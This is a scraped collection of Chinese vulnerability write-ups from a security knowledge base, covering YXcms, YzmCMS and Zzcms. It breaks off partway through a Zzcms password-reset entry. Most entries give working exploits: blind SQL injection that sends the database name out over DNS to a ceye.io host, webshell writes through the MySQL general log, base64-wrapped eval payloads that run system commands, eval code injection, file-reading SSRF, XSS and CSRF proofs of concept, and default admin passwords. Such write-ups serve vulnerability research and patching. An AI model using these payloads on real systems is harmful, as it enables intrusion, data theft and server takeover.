if(model('fragment')->delete(\"id='$id'\")) echo 1; else echo '删除失败~'; }else{ if(empty($_POST['delid'])) $this->error('您没有选择~'); $delid=implode(',',$_POST['delid']); if(model('fragment')->delete('id in ('.$delid.')')) $this->success('删除成功',url('fragment/index')); } } 我们跟if(model('fragment')->delete(\"id='$id'\")),它会先到protected/core.php文件里面的model function model($model){ static $objArray = array(); $className = $model . 'Model'; if( !is_object($objArray[$className]) ){ if( !class_exists($className) ) { throw new Exception(config('_APP_NAME'). '/' . $className . '.php 模型类不存在'); } $objArray[$className] = new $className(); } return $objArray[$className]; } 然后到protected/apps/admin/model/fragmentModel.php 继续protected/base/model/baseModel.php prefix=config('DB_PREFIX'); } } 再来到最底层的数据库操作类protected/base/model/model.php的第45行 public function delete($condition){ return $this->model->table($this->table, $this->ignoreTablePrefix)->where($condition)->delete(); } 这个delete()是从哪里来的，我们来看第十三行的代码,创建了一个对象cpModel static public function connect($config, $force=false){ static $model = NULL; if( $force==true || empty($model) ){ $model = new cpModel($config); } return $model; } 漏洞文件在protected/include/core/cpModel.class.php, public function delete() { $table = $this->options['table']; //当前表 $where = $this->_parseCondition(); //条件 if ( empty($where) ) return false; //删除条件为空时，则返回false，避免数据不小心被全部删除 $this->sql = \"DELETE FROM $table $where\"; $query = $this->db->execute($this->sql); return $this->db->affectedRows(); } 这里用到了一个方法_parseCondition() private function _parseCondition() { $condition = $this->db->parseCondition($this->options); $this->options['where'] = ''; $this->options['group'] = ''; $this->options['having'] = ''; $this->options['order'] = ''; $this->options['limit'] = ''; $this->options['field'] = '*'; return $condition; } } 这个函数是在protected/include/core/db/cpMysql.class.php的128行 public function parseCondition($options) { $condition = \"\"; if(!empty($options['where'])) { $condition = \" WHERE \"; if(is_string($options['where'])) { $condition .= $options['where']; } else if(is_array($options['where'])) { foreach($options['where'] as $key => $value) { $condition .= \" `$key` = \" . $this->escape($value) . \" AND \"; } $condition = substr($condition, 0,-4); } else { $condition = \"\"; } } if( !empty($options['group']) && is_string($options['group']) ) { $condition .= \" GROUP BY \" . $options['group']; } if( !empty($options['having']) && is_string($options['having']) ) { $condition .= \" HAVING \" . $options['having']; } if( !empty($options['order']) && is_string($options['order']) ) { $condition .= \" ORDER BY \" . $options['order']; } if( !empty($options['limit']) && (is_string($options['limit']) || is_numeric($options['limit'])) ) { $condition .= \" LIMIT \" . $options['limit']; } if( empty($condition) ) return \"\"; return $condition; } 里面有一个行数来过滤escape,我们找到74行的这个函数定义 public function escape($value) { if( isset($this->_readLink) ) { $link = $this->_readLink; } elseif( isset($this->_writeLink) ) { $link = $this->_writeLink; } else { $link = $this->_getReadLink(); } if( is_array($value) ) { return array_map(array($this, 'escape'), $value); } else { if( get_magic_quotes_gpc() ) { $value = stripslashes($value); } return \"'\" . mysql_real_escape_string($value, $link) . \"'\"; } } 不过这个函数有一句is_array如果是数组才会执行下面的过滤，如果不是的话就正常执行下去,没有任何sql的过滤就造成了注入漏洞。 复现 这个盲注可以用http://ceye.io和python脚本跑 http://0-sec.org/index.php?r=admin/fragment/index payload: 1 and if((select load_file(concat('\\\\\\\\',(select database()),'.xxxx.ceye.io\\\\abc'))),1,1))-- - 点击删除 post包 POST /index.php?r=admin/fragment/del HTTP/1.1 Host: 0-sec.org User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 188 Referer: [url]http://127.0.0.1/index.php?r=admin/fragment/index[/url] Cookie: PHPSESSID=bbei6n32cuevaf1lbi0n79rdj2; Connection: close Upgrade-Insecure-Requests: 1 delid%5B%5D=select LOAD_FILE((CONCAT('\\\\\\\\',(SELECT DATABASE()),'.8571e594.2m1.pw\\\\abc')))&__hash__=529fbedab8a7b8a3f3f5a0f394f51cf2_08ebfXTKPoKd0tX4iq+aFMwhq5QkkRGC/NfUu/Ny83+UmU8u0MoCIj8 然后用burp截获数据，修改内容加上我们的payload，用原文的payload后面+会报错 然后进入http://ceye.io/records/dns 查看我们的数据 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-03 18:38:00 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/YXcms/1.html":{"url":"0day/YXcms/1.html","title":"（CVE-2018-11003）YXcms 1.4.7跨站请求伪造漏洞","keywords":"","body":"（CVE-2018-11003）YXcms 1.4.7 跨站请求伪造漏洞 一、漏洞简介 YXcms 1.4.7版本中的protected/apps/admin/controller/adminController.php文件存在跨站请求伪造漏洞。远程攻击者可借助index.php?r=admin/admin/admindel利用该漏洞删除管理员账户。 二、漏洞影响 YXcms 1.4.7 三、复现过程 POC: 管理员点击链接 http://192.168.232.133/evil.html evil.html test 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-03 18:34:52 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/YzmCMS/YzmCMS v3.6 csrf.html":{"url":"0day/YzmCMS/YzmCMS v3.6 csrf.html","title":"YzmCMS v3.6 csrf","keywords":"","body":"YzmCMS v3.6 csrf 一、漏洞简介 二、漏洞影响 YzmCMS v3.6 三、复现过程 1、文件位置: /application/admin/controller/sql.class.php第10-42行中： public function init() { if(isset($_POST['sqlstr'])){ if(!C('sql_execute')) showmsg('根据系统配置，不允许在线执行SQL命令！', 'stop'); $sqlstr = MAGIC_QUOTES_GPC ? stripslashes($_POST['sqlstr']) : $_POST['sqlstr']; $sqlstr = rtrim(trim($sqlstr), ';'); $sqls = $_POST['action']=='many' ? explode(';', $sqlstr) : array(0 => $sqlstr); $admin = D('admin'); foreach($sqls as $sql){ 10. if(stristr($sql, 'outfile')){ 11. $str = 'ERROR : 检测到非法字符 “outfile”！'; 12. break; 13. } 14. if(stristr($sql, '.php')){ 15. $str = 'ERROR : 检测到非法字符 “.php” ！'; 16. break; 17. } 18. if(preg_match(\"/^drop(.*)database/i\", $sql)){ 19. $str = 'ERROR : 不允许删除数据库！'; 20. break; 21. } 22. $result = $admin->query($sql); 23. if($result){ 24. $str = 'OK : 执行成功！'; 25. if(is_object($result) || is_resource($result)){ 26. $arr = $admin->fetch_all($result); 27. } 28. }else{ 29. $str = 'ERROR : 执行失败！'; 30. break; 31. } 32. } 33. } 这段函数中对提交的sql参数进行还原处理，然后进行非法字符检测，检测字符是否存在”oufile”、”.php”,匹配是否有删除数据的操作等。 2、如何绕过这种限制？ 首页，outfile被禁止，第一时间想到的就是SQL语句利用日志写入文件，但是写入脚本文件”.php”会被检测到非法字符；然后，尝试MySQL中concat函数来连接字符串，拆分’.php’关键词，如 CONCAT(\"test.\",\"php\");最后构造出可以写入文件，绕过非法字符检测的的SQL语句，从而触发代码执行漏洞，控制服务器。 Payload： show variables like '%general%'; #查看配置 set global general_log = on; #开启general log模式 set global general_log_file =CONCAT(\"E:\\\\study\\\\WWW\\\\YzmCMS\\\\test.\",\"php\"); select ''; #写入shell 漏洞复现 如何获取后台管理员权限 有两种思路： 思路A：通过默认信息，弱口令登录 默认后台路径：http://www.0-sec.org/admin/index/login.html 管理员默认账号密码均为：yzmcms 思路B：通过CSRF漏洞，诱导管理员访问，自动在后台添加管理员账号。 CSRF漏洞利用代码如下： OWASP CRSFTester Demonstration var pauses = new Array( \"68\" ); function pausecomp(millis) { var date = new Date(); var curDate = null; do { curDate = new Date(); } while(curDate-date OWASP CRSFTester Demonstration 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-11 16:43:22 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/YzmCMS/YzmCMS v3.6 远程命令执行.html":{"url":"0day/YzmCMS/YzmCMS v3.6 远程命令执行.html","title":"YzmCMS v3.6 远程命令执行","keywords":"","body":"YzmCMS v3.6 远程命令执行 一、漏洞简介 二、漏洞影响 YzmCMS v3.6 三、复现过程 Payload： show variables like '%general%'; #查看配置 set global general_log = on; #开启general log模式 set global general_log_file =CONCAT(\"E:\\\\study\\\\WWW\\\\YzmCMS\\\\test.\",\"php\"); select ''; #写入shell 1、执行sql语句，查看mysql日志配置情况 2、根据日志文件位置或者默认站点路径来推测站点目录，可用load_file()函数来测试，确认站点目录位置。或者通过phpinfo()等信息收集获取站点目录。 3、分别执行下列sql语句，将脚本代码写入文件： set global general_log = on; set global general_log_file =CONCAT(\"E:\\\\study\\\\WWW\\\\YzmCMS\\\\test.\",\"php\"); select ''; 4、提交参数，执行脚本代码： 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-11 16:43:19 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/YzmCMS/CVE-2018-7653.html":{"url":"0day/YzmCMS/CVE-2018-7653.html","title":"（CVE-2018-7653）YzmCMS v3.6 xss漏洞","keywords":"","body":"（CVE-2018-7653）YzmCMS v3.6 xss漏洞 一、漏洞简介 YzmCMS是中国程序员袁志蒙开发的一套开源的CMS（内容管理系统）。 YzmCMS 3.6版本中存在跨站脚本漏洞。远程攻击者可借助‘a’、‘c’或‘m’参数利用该漏洞注入任意的Web脚本或HTML。 二、漏洞影响 YzmCMS v3.6 三、复现过程 poc http://www.0-sec.org/YzmCMS/index.php?m=search&c=index&a=initxqb4n%3Cimg%20src%3da%20onerror%3dalert(1)%3Ecu9rs&modelid=1&q=tes http://www.0-sec.org/YzmCMS/index.php?m=search&c=indexf9q6s%3cimg%20src%3da%20onerror%3dalert(1)%3ej4yck&a=init&modelid=1&q=tes http://www.0-sec.org/YzmCMS/index.php?m=searchr81z4%3cimg%20src%3da%20onerror%3dalert(1)%3eo92wf&c=index&a=init&modelid=1&q=tes http://www.0-sec.org/YzmCMS/index.php?m=search&c=index&a=init&modelid=1b2sgd%22%3e%3cscript%3ealert(1)%3c%2fscript%3eopzx0&q=tes 参考链接 https://www.anquanke.com/vul/id/1124944 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-11 16:44:42 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/YzmCMS/CVE-2018-8756.html":{"url":"0day/YzmCMS/CVE-2018-8756.html","title":"（CVE-2018-8756）YzmCMS v3.7.1 Eval注入漏洞","keywords":"","body":"（CVE-2018-8756）YzmCMS v3.7.1 Eval注入漏洞 一、漏洞简介 YzmCMS是中国程序员袁志蒙开发的一套开源的CMS（内容管理系统）。 YzmCMS 3.7.1版本中的yzmphp/core/function/global.func.php文件存在安全漏洞。远程攻击者可借助index.php?m=member&c=member_content&a=init请求的POST数据中的PHP代码利用该漏洞执行任意代码。 二、漏洞影响 YzmCMS v3.7.1 三、复现过程 首先，从网站后台登陆，/index.php?m=admin&c=index&a=init，然后选择模型管理，选 择模型 ID 为 1 的那个字段管理，然后添加字段，像下面这张图一样填表。 接着需要拦截数据包，像图片一样， 修改 fieldtype 为 datetime，修改 datesest 为 array(1);@eval($_POST[wushuang]) 接着我们需要一个用户可以触发这个漏洞，选择会员管理，选择会员管理，添加用户， 填表如下。 现 在 我 们 已 经 完 成 了 准 备 工 作 ， 接 着 以 用 户 身 份 登 陆 ， guici/123456,/index.php?m=member&c=index&a=login，点击在线投稿，接着你就可以执行任 意代码通过输入 post 数据 wushuang！/index.php?m=member&c=member_content&a=init 参考链接 https://github.com/guiciwushuang/yzmcms/blob/master/yzmcms_eval_injection_chinese.pdf 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-11 16:43:14 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/YzmCMS/CVE-2018-19092.html":{"url":"0day/YzmCMS/CVE-2018-19092.html","title":"（CVE-2018-19092）YzmCMS v5.2 xss漏洞","keywords":"","body":"（CVE-2018-19092）YzmCMS v5.2 xss漏洞 一、漏洞简介 二、漏洞影响 三、复现过程 http://www.0-sec.org/search/index/archives/pubtime/1526387722/page/1.html XSS payload: alert(1\">http://www.0-sec.org/search/index/archives/pubtime/1526387722/page/1.html?tqh3l%22%3e%3cscript%3ealert(1)%3c%2fscript%3er6qt2=1r6qt2=1) POC: GET /search/index/archives/pubtime/1526387722/page/1.html?tqh3l%22%3e%3cscript%3ealert(1)%3c%2fscript%3er6qt2=1 HTTP/1.1 Host: www.0-sec.org Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Referer: http://192.168.1.40/search/index/archives/pubtime/1526387722.html Cookie: PHPSESSID=u0bh5qnr84qsu9aa0oj8vpkuk2 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-11 16:57:40 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/YzmCMS/YzmCMS V5.3 后台ssrf .html":{"url":"0day/YzmCMS/YzmCMS V5.3 后台ssrf .html","title":"YzmCMS V5.3 后台ssrf ","keywords":"","body":"YzmCMS V5.3 后台ssrf 一、漏洞简介 二、漏洞影响 YzmCMS V5.3 三、复现过程 漏洞分析 漏洞位于 application\\collection\\controller\\collection_content.class.php 中的 collection_test 函数，此函数为获取一个网页中的URL，并获取此URL的值输出。类似于爬虫，爬取网页中URL对应的文章。以下为主要功能函数：　 首先查看 get_content()函数： 可以看到传进来的URL不进过任何检测规则就带入 file_get_content()函数，那么倘若此 $url 为 file:// 伪协议的话，如此则产生任意文件读取漏洞。那么此时回头看 $url的值是否可控。 可以看到，$url 的值来自于 collection_node 表中的 urlpage 字段的值。如果要 $url 可控，那么就要找到一个数据库写入操作，并且urlpage 字段的值可控。再看 此函数则是将$_POST的数据写入到表中。看 insert 函数如何写。 可以看到在写入过程中经过过滤函数 safe_data() ： 假设payload为：file://C:/Windows/System32/drivers/etc/hosts 可以看到此过滤函数对此payload并无任何影响，所以导致插入数据库中的urlpage字段的值可控，由此导致$url的值可控。再往下查看 get_sub_content()函数： 可以看到此函数是将 $html 中的 $start 和 $end 之间的值取出来，而 $start 表示区间开始的html表示，$end 表示区间结束的html标识。并且这两个标识不能为空。于是可以构造payload为：file://C:/Windows/System32/drivers/etc/hosts，如此进过上述函数则会取出payload并返回。再往下： 进入get_all_url()函数： public static function get_all_url($html, $url_contain='', $url_except='') { $html = str_replace(array(\"\\r\", \"\\n\"), '', $html); $html = str_replace(array(\"\", \"\"), \"\\n\", $html); preg_match_all('/]*)>([^\\/a>].*)/i', $html, $out); $data = array(); foreach ($out[1] as $k=>$v) { if (preg_match('/href=[\\'\"]?([^\\'\" ]*)[\\'\"]?/i', $v, $match_out)) { if ($url_contain) { if (strpos($match_out[1], $url_contain) === false) { continue; } } if ($url_except) { if (strpos($match_out[1], $url_except) !== false) { continue; } } $url2 = $match_out[1]; $url2 = self::url_check($url2, self::$url); $title = strip_tags($out[2][$k]); if(empty($url2) || empty($title)) continue; $data['url'][$k] = $url2; $data['title'][$k] = $title; } else { continue; } } 发现其中有一个正则过滤： preg_match_all('/])>(\" id=\"reffn_\\/a>\">\\/a>.)/i', $html, $out); ，此正则获取(value)括号中的值，并将其合并为一个数组。再往下看，又出现一个正则过滤： preg_match('/href=[\\'\"]?(\\'\" *)[\\'\"]?/i', $v, $match_out) ，此规则为href=\"(value)\"，并获取括号中value的值给$match_out，那么此时我们的payload需更改为： test 此时在往下看，有一个url_check函数： 可以看到会检测最后取出payload的值中是否有 :// ，巧的是我们的payload正好符合，所以该检测函数并未对payload造成影响。再往下回到最初的函数中： 至此，$articleurl 的值为我们最后的payload： file://C:/Windows/System32/drivers/etc/hosts ，直至此时，$article 的值为读取到的本地任意文件的内容，再往下看 get_filter_html()函数： $data``[``'content'``] = self::replace_item(self::get_sub_content(``$html``, ``$config``[``'content_rule'``][0], ``$config``[``'content_rule'``][1]), ``$config``[``'content_html_rule'``]); ``return` `$data``; 由于篇幅限制，只拿出影响读取内容的代码，其实这段代码对结果并无影响，有兴趣自己下来阅读。在往下看到： admin_tpl()函数为加载模板的函数，此模板位于：application\\collection\\view\\collection_test.html 此处只截出影响此漏洞的代码。此处可以看到，将读取出的任意文件内容显示出来，到此则漏洞分析完毕。 漏洞复现 操作系统：windows 7 php版本：5.5.38 + Apache mysql版本：5.5.53 首先登陆后台，进入 模块管理--->采集管理 添加节点 此处网站配置框中，可以在自己的vps服务器中搭建一个html网页，其内容为payload： 123 获取网站中的区域开始html为，区域结束的HTML为。点击保存。 再次点击测试采集，则读取payload中的hosts文件。 复现成功。 参考链接 https://www.cnblogs.com/Spec/p/11188198.html 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-11 16:38:38 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/YzmCMS/YzmCMS V5.4 后台getshell.html":{"url":"0day/YzmCMS/YzmCMS V5.4 后台getshell.html","title":"YzmCMS V5.4 后台getshell（一） ","keywords":"","body":"YzmCMS V5.4 后台getshell（一） 一、漏洞简介 二、漏洞影响 YzmCMS V5.4 三、复现过程 漏洞分析 发现的第一个问题出现在缓存文件写入函数处，文件为yzmphp/core/class/cache_file.class.php，函数名为_fileputcontents 可以看到，补丁在原先的$contents前拼接了一段\\n，而如果要进入序列化的代码，需要$this->config['mode']为1，然后就是正常的写入文件。 调用这个函数的是同类下的set函数 public function set($id, $data, $cachelife = 0){ $cache = array(); $cache['contents'] = $data; $cache['expire'] = $cachelife === 0 ? 0 : SYS_TIME + $cachelife; $cache['mtime'] = SYS_TIME; if(!is_dir($this->config['cache_dir'])) { @mkdir($this->config['cache_dir'], 0777, true); } $file = $this->_file($id); return $this->_fileputcontents($file, $cache); } 而这个类cache_file在cache_factory中被实例化。 在文件yzmphp/core/class/cache_factory.class.php中可以看到 public static function get_instance() { if(self::$instances==null){ self::$instances = new self(); switch(C('cache_type')) { case 'file' : yzm_base::load_sys_class('cache_file','',0); self::$class = 'cache_file'; self::$config = C('file_config'); break; case 'redis' : yzm_base::load_sys_class('cache_redis','',0); self::$class = 'cache_redis'; self::$config = C('redis_config'); break; case 'memcache' : yzm_base::load_sys_class('cache_memcache','',0); self::$class = 'cache_memcache'; self::$config = C('memcache_config'); break; default : yzm_base::load_sys_class('cache_file','',0); self::$class = 'cache_file'; self::$config = C('file_config'); } } return self::$instances; } 这三个类提供了相同的功能，使用者可以通过配置来选择其中的某一个类，默认配置下便是cache_file类。 而系统中通过cache_factory类来实例化缓存类的函数是在yzmphp/core/function/global.func.php中的setcache function setcache($name, $data, $timeout=0) { yzm_base::load_sys_class('cache_factory','',0); $cache = cache_factory::get_instance()->get_cache_instances(); return $cache->set($name, $data, $timeout); } 所以传给setcache的第一个参数将作为文件名的一部分(后缀为php)，第二个参数将成为文件内容的一部分。缓存配置相同的情况下，文件名路径不变，只要传递的内容可控就可以写入代码从而getshell。 而对setcache的调用有多处，其中有一些是不能用的，因为会过滤尖括号，比如wechat和urlrule模块，最后我通过用户自定义配置成功写入代码。 在文件commom/function/system.func.php中有 function get_config($key = ''){ if(!$configs = getcache('configs')){ $data = D('config')->where(array('status'=>1))->select(); $configs = array(); foreach($data as $val){ $configs[$val['name']] = $val['value']; } setcache('configs', $configs); } if(!$key){ return $configs; }else{ return array_key_exists($key, $configs) ? $configs[$key] : ''; } } setcache的第二个参数是从数据库中config表读取的，因此找到一个写入该表的接口，再使得get_config函数被调用即可。调用get_config比较简单，因为这个函数是用于获取配置的，很多地方都用到了，只要刷新页面即可。所以重点是找到可用的写入接口。 在文件application/admin/controller/system_manage.class.php中就有一个可用的接口 public function user_config_add() { if(isset($_POST['dosubmit'])){ $config = D('config'); $res = $config->where(array('name' => $_POST['name']))->find(); if($res) return_json(array('status'=>0,'message'=>'配置名称已存在！')); if(empty($_POST['value'])) return_json(array('status'=>0,'message'=>'配置值不能为空！')); $_POST['type'] = 99; if(in_array($_POST['fieldtype'], array('select','radio'))){ $_POST['setting'] = array2string(explode('|', rtrim($_POST['setting'], '|'))); }else{ $_POST['setting'] = ''; } if($config->insert($_POST)){ delcache('configs'); return_json(array('status'=>1,'message'=>L('operation_success'))); }else{ return_json(array('status'=>0,'message'=>L('data_not_modified'))); } } include $this->admin_tpl('user_config_add'); } 可以看到post过来的值被直接insert到了config表(如果insert的第二个参数为true则会进行过滤)，所以这个接口就可以用于写入代码。 漏洞复现 因为安装以后的默认配置中的file_config的mode为2，所以在我们发现的第一个函数_fileputcontents中是不会进入序列化代码的阶段，在进行写入以前，我们需要手动修改配置文件common/config/config.php //缓存类型为file缓存时的配置项 'file_config' => array ( 'cache_dir' => YZMPHP_PATH.'cache/chche_file/', //缓存文件目录 'suffix' => '.cache.php', //缓存文件后缀 'mode' => '1', //缓存格式：mode 1 为serialize序列化, mode 2 为保存为可执行文件array ), 将该处的mode改为1保存即可 然后使用yzmcms/yzmcms登陆后台，来到系统管理的自定义配置处 然后添加配置，写入代码即可。 添加以后去查看缓存文件夹cache/chche_file，可以看到configs.cache.php 直接在浏览器打开 参考链接 https://xz.aliyun.com/t/7231#toc-5 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-04 23:39:08 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/YzmCMS/1.html":{"url":"0day/YzmCMS/1.html","title":"YzmCMS V5.4 后台getshell（二）","keywords":"","body":"YzmCMS V5.4 后台getshell（二） 一、漏洞简介 二、漏洞影响 YzmCMS V5.4 三、复现过程 漏洞分析 这个cms中有一些配置项是写在文件中，也有一些是写在数据库中的，例如上一个漏洞提到的mode就是写在文件中，而我们的payload是写在数据库中再进行读取的，为了避免上面手动修改配置文件这一过程，我找到了一个函数可以修改配置文件，但是问题是只能对规定的4个key进行修改，所以是不能直接修改mode这个key的。于是我回去查看补丁，发现修改配置的函数也进行了修改。 该函数位于文件application/admin/common/function/function.php function set_config($config) { $configfile = YZMPHP_PATH.'common'.DIRECTORY_SEPARATOR.'config/config.php'; if(!is_writable($configfile)) showmsg('Please chmod '.$configfile.' to 0777 !', 'stop'); $pattern = $replacement = array(); foreach($config as $k=>$v) { $pattern[$k] = \"/'\".$k.\"'\\s*=>\\s*([']?)[^']*([']?)(\\s*),/is\"; $replacement[$k] = \"'\".$k.\"' => \\${1}\".$v.\"\\${2}\\${3},\"; } $str = file_get_contents($configfile); $str = preg_replace($pattern, $replacement, $str); return file_put_contents($configfile, $str, LOCK_EX); } 可以看到，补丁在原来的函数中增加了一行代码，将传入的$config中的字符,和$移除了，而原先就直接经过特定的正则表达式将config.php文件中的内容进行替换后再写回去。 调用这个函数的地方，除了安装的页面就只有application/admin/controller/system_manage.class.php中的save public function save() { yzm_base::load_common('function/function.php', 'admin'); if(isset($_POST['dosubmit'])){ if(isset($_POST['mail_inbox']) && $_POST['mail_inbox']){ if(!is_email($_POST['mail_inbox'])) showmsg(L('mail_format_error')); } if(isset($_POST['upload_types'])){ if(empty($_POST['upload_types'])) showmsg('允许上传附件类型不能为空！', 'stop'); } $arr = array(); $config = D('config'); foreach($_POST as $key => $value){ if(in_array($key, array('site_theme','watermark_enable','watermark_name','watermark_position'))) { $value = safe_replace(trim($value)); $arr[$key] = $value; }else{ if($key!='site_code'){ $value = htmlspecialchars($value); } } $config->update(array('value'=>$value), array('name'=>$key)); } set_config($arr); delcache('configs'); showmsg(L('operation_success'), '', 1); } } 在save中，只有key为'site_theme','watermark_enable','watermark_name','watermark_position'的配置项会经过safe_replace后传入set_config，其他项则是直接在数据库中更新。 safe_replace则对一些特殊字符进行了过滤 function safe_replace($string) { $string = str_replace('%20','',$string); $string = str_replace('%27','',$string); $string = str_replace('%2527','',$string); $string = str_replace('*','',$string); $string = str_replace('\"','',$string); $string = str_replace(\"'\",'',$string); $string = str_replace(';','',$string); $string = str_replace('','&gt;',$string); $string = str_replace(\"{\",'',$string); $string = str_replace('}','',$string); $string = str_replace('\\\\','',$string); return $string; } 审计完代码以后我们可以发现post过去的值，只有特定的key会被写入配置文件，而value不能包含safe_replace中的特殊字符，最后value会被拼接成为preg_replace中的第二个参数$replacement的一部分。而在$replacement中用了${1}这样的形式来指定上文匹配到的'，虽然{}被过滤了，但是$1实际上是与${1}等价的，因此我们通过这种方式闭合单引号，然后,也没有被过滤，所以我们可以在键值对的后面插入别的代码，可惜的是>是被过滤的，所以我们无法插入key => value这样的形式来修改项。不过可以直接插入函数，像array(0=>1,func())的形式中，func是会被执行的，并且将返回值作为value成为array的一部分。 所以只要闭合了单引号，再传递一个eval过去就可以执行代码了，因为有过滤函数，所以可以再套一层base64。 漏洞复现 设置的接口在系统管理的系统设置中的附加设置处。 通过上文的分析我们来构建payload。 将system('echo 123');base64_encode以后为c3lzdGVtKCdlY2hvIDEyMycpOw==，套一层eval并且闭合单引号后payload为 $1,eval(base64_decode($1c3lzdGVtKCdlY2hvIDEyMycpOw==$1)),$1 先查看配置文件原先的内容 回到页面，水印图片名称就是可用的一个配置项，在这个地方写入我们的payload并提交。 提交以后可以发现已经成功执行命令了 再回去查看配置文件可以看到代码也写入了 参考链接 https://xz.aliyun.com/t/7231#toc-5 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-04 23:39:04 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Zzcms/zzcms2018最新版重装getshell.html":{"url":"0day/Zzcms/zzcms2018最新版重装getshell.html","title":"Zzcms 2018 最新版重装getshell","keywords":"","body":"Zzcms 2018 最新版重装getshell 一、漏洞简介 源码信息：Zzcms 2018 问题文件： \\zzcms\\install\\index.php 漏洞类型：重装getshell 站点地址：http://www.zzcms.net/ 二、漏洞影响 Zzcms2018 三、复现过程 0x01攻击分析 在文件\\ zzcms \\ install \\ index.php文件的第9-10行中$ _POST使用了提取变量注册的方法进行变量的初始化。 if($_POST) extract($_POST, EXTR_SKIP);//把数组中的键名直接注册为了变量。就像把$_POST[ai]直接注册为了$ai。 if($_GET) extract($_GET, EXTR_SKIP); $submit = isset($_POST['submit']) ? true : false; $step = isset($_POST['step']) ? $_POST['step'] : 1; 分析代码可以知道，setp为空的时候，初始化初始化的变量1，然后进入到step_1.php，有install.lock，就不能重装，所以我们这里直接POST step = 2绕过 alert(\"'.$msg.'\");window.history.back();'; exit; } $conn=connect($db_host,$db_user,$db_pass,'',$db_port); if(!$conn) dexit('无法连接到数据库服务器，请检查配置'); $db_name or dexit('请填写数据库名'); if(!select_db($db_name)) { if(!query(\"CREATE DATABASE $db_name\")) dexit('指定的数据库不存在\\n\\n系统尝试创建失败，请通过其他方式建立数据库'); } $url=str_replace(\"'\",'',$url); //保存配置文件 $fp=\"../inc/config.php\"; $f = fopen($fp,'r'); $str = fread($f,filesize($fp)); fclose($f); $str=str_replace(\"define('sqlhost','\".sqlhost.\"')\",\"define('sqlhost','$db_host')\",$str) ; $str=str_replace(\"define('sqlport','\".sqlport.\"')\",\"define('sqlport','$db_port')\",$str) ; $str=str_replace(\"define('sqldb','\".sqldb.\"')\",\"define('sqldb','$db_name')\",$str) ; $str=str_replace(\"define('sqluser','\".sqluser.\"')\",\"define('sqluser','$db_user')\",$str) ; $str=str_replace(\"define('sqlpwd','\".sqlpwd.\"')\",\"define('sqlpwd','$db_pass')\",$str) ; $str=str_replace(\"define('siteurl','\".siteurl.\"')\",\"define('siteurl','$url')\",$str) ; $str=str_replace(\"define('logourl','\".logourl.\"')\",\"define('logourl','$url/image/logo.png')\",$str) ; $f=fopen($fp,\"w+\");//fopen()的其它开关请参看相关函数 fputs($f,$str);//把替换后的内容写入文件 fclose($f); //创建数据 include 'step_'.$step.'.php'; break; case '6'://安装成功 include 'step_'.$step.'.php'; break; } step_3.php文件中有一个创建的令牌，后面创建数据库的时候验证，所以从步骤= 2，一步一步偶。 从上面的代码文中知道$ url = str_replace（“'”，“，$ url）; 把单引号替换为空了，然后的fputs写INC / config.php的配置文件中所以这里通过$ DB_NAME来写到配置文件。 0×02复漏洞现 在数据库配置页面，数据库名填写： zzcms%27%29%3bphpinfo%28%29%3b%2f%2f 本机创建zzcms');phpinfo();//的数据库 因为本地有JS验证，所以先把数据库名改成123，bp抓到包以后在修改成zzcms%27%29%3bphpinfo%28%29%3b%2f%2f 成功写入到配置文件 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-03 18:28:08 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Zzcms/zzcms 8.2 任意用户密码修改.html":{"url":"0day/Zzcms/zzcms 8.2 任意用户密码修改.html","title":"Zzcms 8.2 任意用户密码修改","keywords":"","body":"Zzcms 8.2 任意用户密码修改 一、漏洞简介 Zzcms是一款企业建站程序。 zzcms 8.2版本/one/getpassword.php文件存在漏洞，攻击者可利用该漏洞修改任意用户密码。 二、漏洞影响 Zzcms 8.2 三、复现过程 漏洞分析 /one/getpassword.php文件第 73行，触发漏洞的关键代码。 }elseif($action==\"step3\" && @$_SESSION['username']!=''){ 